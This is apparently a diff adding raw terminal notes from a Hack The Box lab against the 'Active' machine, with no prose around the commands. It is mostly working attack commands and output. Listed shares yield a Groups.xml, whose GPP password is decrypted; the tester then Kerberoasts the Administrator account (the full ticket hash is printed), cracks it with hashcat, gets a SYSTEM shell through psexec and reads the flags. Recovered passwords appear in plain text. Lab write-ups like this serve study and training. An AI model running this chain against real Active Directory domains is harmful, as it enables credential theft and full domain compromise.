@@ -1,0 +1,210 @@
+└──╼ $smbmap -R Replication -H 10.10.10.100
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                              >
+        Disk                                                    Permissions     >
+        ----                                                    -----------     >
+        Replication                                             READ ONLY
+        .\Replication\*
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    active.htb
+        .\Replication\active.htb\*
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    DfsrPrivate
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Policies
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    scripts
+        .\Replication\active.htb\DfsrPrivate\*
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ConflictAndDelet>
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Deleted
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Installing
+        .\Replication\active.htb\Policies\*
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    {31B2F340-016D-1>
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    {6AC1786C-016F-1>
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}>
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
+        fr--r--r--               23 Sat Jul 21 12:38:11 2018    GPT.INI
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Group Policy
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    MACHINE
+        dr--r--r--                0 Sat Jul 21 12:37:44 2018    USER
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}>
+
+smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q --depth 10
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                              >
+[+] Starting search for files matching 'Groups.xml' on share Replication.
+[+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D>
+
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active]
+└──╼ $smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                              >
+[+] Starting search for files matching 'Groups.xml' on share Replication.
+
+└──╼ $cat 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F->
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51>
+</Groups>
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active/smb]
+└──╼ $gpp-decrypt
+Usage: gpp-decrypt: encrypted_data
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active/smb]
+└──╼ $gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjT>
+/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+GPPstillStandingStrong2k18
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active/smb]
+
+
+┌─[npe@pcs-pentest]─[/usr/share/doc/python3-impacket/examples]
+└──╼ $python3 GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Querying 10.10.10.100 for information about domain.
+Name                  Email                           PasswordLastSet      LastL>
+--------------------  ------------------------------  -------------------  ----->
+Administrator                                         2018-07-18 21:06:40.351723>
+Guest                                                 <never>              <neve>
+krbtgt                                                2018-07-18 20:50:36.972031>
+SVC_TGS                                               2018-07-18 22:14:38.402764>
+┌─[npe@pcs-pentest]─[/usr/share/doc/python3-impacket/examples]
+└──╼ $
+
+
+┌─[✗]─[npe@pcs-pentest]─[/usr/share/doc/python3-impacket/examples]
+└──╼ $smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.>
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                              >
+        Disk                                                    Permissions     >
+        ----                                                    -----------     >
+        ADMIN$                                                  NO ACCESS       >
+        C$                                                      NO ACCESS       >
+        IPC$                                                    NO ACCESS       >
+        NETLOGON                                                READ ONLY       >
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY       >
+        Users                                                   READ ONLY
+
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active]
+└──╼ $smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.>
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                              >
+[+] Starting search for files matching 'user.txt' on share NETLOGON.
+[+] Starting search for files matching 'user.txt' on share Replication.
+[+] Starting search for files matching 'user.txt' on share SYSVOL.
+[+] Starting search for files matching 'user.txt' on share Users.
+[+] Match found! Downloading: Users\SVC_TGS\Desktop\user.txt
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active]
+└──╼ $ls
+10.10.10.100-Users_SVC_TGS_Desktop_user.txt  notes.txt  smb
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active]
+└──╼ $cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txt
+86d67d8ba232bb6a254aa4d10159e983
+┌─[npe@pcs-pentest]─[~/Documents/HTB/lab/active]
+└──╼ $
+
+runas /netonly /user:active.htb\svc_tgs cmd
+
+┌─[✗]─[npe@pcs-pentest]─[/usr/share/doc/python3-impacket/examples]
+└──╼ $sudo ntpdate 10.10.10.100
+
+┌─[npe@pcs-pentest]─[/usr/share/doc/python3-impacket/examples]
+└──╼ $python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPP>
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                   >
+--------------------  -------------  ------------------------------------------->
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=>
+
+
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$65916859c7a971d316d8dfc5fa04bd24$5cc70da853c4181458749c7d4d50b5a0197ee84c43678913ae0e4311d7f8c555cf5b70831abe8a5459dcbf9f284dd55067ad4082db3cb40bdee66b244897b4482c453d73b8f0f3bb723aa7d604d90e67c1c371ae83f8bea40049cb2bdc34b5f6bc3ad0aaa50312be178576f896c40a8ab0bc6bd34af0b9ddb434b862ef535292dc30e76f6b44e84101603ecd15f9389d3f06671f426153559e98c0bd48ffdaa6bd0dc6ceed95d2da70e4e55a422ebf39793bd7f0bd9e47a5390344f18cf1fcb8c7c0823d8b8e2f09429c6f2f1fcf4f97172ebdbe9860df87ce2794e2388b282321bdf0e66da4c501e70642e06532c963719ce2f6affa330491444b3e8218f69b7cae6b1380b1454b0ebf4b9bea3fcb13850c7c51e6fa32a3ea064e1cb309a9cdc995a268fb9f0e35ac8fd8e163c5dad0477272e0b3970405f7c0f38d3dc490ecb0790cb6c91de8413b5dbd099f4476932e203d74a7140ad3ed0928c9238c5d8d969333a02e80d9af9b21720df6f6314480da2f9a03aa13f95c57428720c7cb2cc72f93b15bb3829008e1915875b778694b37b22504a7e33b0e2e8f6e8125be0b60639b94a640159ffa14660f1ac69f932aeae09d6d28b8709956ed415ee16a74f7fdcb21757875b2818cacccef5889fe566087aee54b46ad9c83bc5dd89f6191df90201416a9257854666c7ddf1ea56e180bf1dcb4bcb29dab5790cc1c7f035ecc7f955ddc6dffb26b444ddf46e8561d4e7e8208db4d465a98d9a2c2cc8cb49c025a09c5db7457ce2c7f4c7a190f39d3a8e81eb22e98f2151062698500579708f573cd54c4becd45d34f055c87661a79fb223b84aa14afd6814d0984b306a582f477953615fdfd58e9e2b3611e6cee05eed798f0d1e07d2d3f4623f90cfc84fbe8ddba5bbc3933229090246ad4e0a3bbdedb9917c1859321abbd432f57c03460031112ce28f5d6b0c00ee04b932f87ac4de7a79bc302fe4210964268086c9b29865286fdb114f31295163a101c4862bd5bc83a80318c891f1c98e082b7597c5d8577fbcd26b4dff3ffa274a2a5e026b77d468333d5113b73e9b6c95ba760f0566b43c36455bad37b6857b00bb6d14ea6de0cb15a6ceaef29de4a2bd703ea864d0108c5d8dd90c49ed4b18a1a2498d73d88610961d05babdc38616881533448ce0f82fcc44e69c7842616a4b07d6539aeef2911bfe16d763e6f4cf2abd98bd5282fcf7e6adefc64f3c9108aef5648cca6b4ccab9895f8017f7b0a
+
+
+└──╼ $hashcat -m 13100 --force -a 0 /home/npe/Documents/HTB/lab/active/kerberosh>
+hashcat (v6.1.1) starting...
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTR>
+==============================================================================>
+* Device #1: pthread-Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz, 5826/5890 MB (2>
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of dras>
+If you want to switch to optimized backend kernels, append -O to your commandl>
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 134 MB
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$65916859c7a971d316d8dfc>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...7f7b0a
+Time.Started.....: Thu Feb 11 12:30:04 2021, (24 secs)
+Time.Estimated...: Thu Feb 11 12:30:28 2021, (0 secs)
+Guess.Base.......: File (/home/npe/Documents/tools/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   437.2 kH/s (9.49ms) @ Accel:32 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10543104/14344385 (73.50%)
+Rejected.........: 0/10543104 (0.00%)
+Restore.Point....: 10534912/14344385 (73.44%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: Tioncurtis23 -> Teague51
+
+Started: Thu Feb 11 12:29:56 2021
+Stopped: Thu Feb 11 12:30:30 2021
+
+Ticketmaster1968
+
+─[✗]─[npe@pcs-pentest]─[/usr/share/doc/python3-impacket/examples]
+└──╼ $python3 psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100>
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file QPeKxuPd.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service bMMw on 10.10.10.100.....
+[*] Starting service bMMw.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>cd..
+
+C:\Windows>cd ..
+
+C:\>cd Users
+
+C:\Users>cd Administrator
+
+C:\Users\Administrator>cd Desktop
+
+C:\Users\Administrator\Desktop>type root.txt
+b5fc76d1d6b91d77b2fbf2d54d0f708b
+
+C:\Users\Administrator\Desktop>
+
+
+
